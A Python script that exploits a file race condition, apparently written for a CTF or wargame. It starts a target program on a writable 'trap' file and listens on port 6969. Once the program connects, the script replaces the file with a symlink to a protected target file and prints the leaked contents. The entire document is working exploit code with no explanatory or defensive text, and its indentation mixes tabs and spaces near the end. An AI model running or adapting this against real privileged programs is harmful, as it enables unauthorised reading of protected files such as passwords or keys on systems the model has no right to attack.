#!/usr/bin/python

import socket
import select
from argparse import ArgumentParser
from os import unlink, symlink, devnull
import subprocess
import sys

def replace_file(file, target):
    print("\n[ + ] Replacing file by symlink")
    unlink(file)
    symlink(target, file)

# Parse argument
parser = ArgumentParser()
parser.add_argument("executable", help="path to the executable")
parser.add_argument("file", help="file path used by the program ( must be writable )")
parser.add_argument("target", help="target file")
args = parser.parse_args()


# Create server socket
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", 6969))
server.listen(1)

inputs = [ server ]

# Run client executable
with open(args.file, 'w') as f:
    f.write('Create a new trap file.')

proc = subprocess.Popen([args.executable, args.file, "127.0.0.1"])

# Read data received from socket

while inputs:
    readable, _, _ = select.select(inputs, [], [])
    for s in readable:
        if s is server:
            conn, caddr = s.accept()
            inputs.append(conn)
            replace_file(args.file, args.target)
        else :
            data = s.recv(64)
            if data:
                print("\n[ + ] recv: {}".format(data.strip()))
            else:
                inputs.remove(s)
                s.close()
		inputs=None

server.close()
# remove trap file
unlink(args.file)
